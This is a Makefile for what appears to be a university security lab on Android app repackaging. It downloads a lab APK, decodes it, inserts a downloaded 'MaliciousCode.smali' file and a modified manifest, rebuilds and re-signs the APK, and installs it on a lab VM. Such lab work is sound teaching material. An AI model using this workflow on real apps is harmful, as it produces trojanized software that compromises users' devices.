#
# Makefile for project tasks
#

# Target app
APP=app
APPNEW=${APP}new

# Alias name for pub/pri keys
ALIAS=my-alias.alias

# Keystore name
KEYSTORE=my-key.keystore

all: task1 task2 task3 task4

task1:
	# Download the apk
	wget http://www.cis.syr.edu/~wedu/seed/Labs_Android5.1/Android_Repackaging/RepackagingLab.apk
	mv RepackagingLab.apk app.apk
	zip -d app.apk META-INF/\*

task2:
	# Decode the apk
	apktool d ${APP}.apk

task3:
	# Get the malicious code
	wget http://www.cis.syr.edu/~wedu/seed/Labs_Android5.1/Android_Repackaging/MaliciousCode.smali
	
	# Move the malicious code in
	cp MaliciousCode.smali app/smali/com/MaliciousCode.smali

	# TODO For now, edit manifest with gedit
	#gedit app/AndroidManifest.xml

	# Copy prepared manifest over
	cp AndroidManifest.xml app/AndroidManifest.xml

task4:
	# Rebuild the APK
	apktool b ${APP} -o ${APPNEW}.apk

	# Sign the APK
	# Generate a public and private key pair
	keytool -alias ${ALIAS} -genkey -v -keystore \
		${KEYSTORE} -keyalg RSA -keysize 2048 -validity 10000

	# Sign the apk
	jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
		-keystore ${KEYSTORE} ${APPNEW}.apk ${ALIAS}

task5: 
	# Connect to the Android VM through IP address
	adb connect 10.0.2.5

	# Install the app
	adb install ${APPNEW}.apk

clean:
	rm -rf ${APP}
	rm -f *.apk
	rm -f *.smali
	rm -f *.sig
	rm -f *.keystore
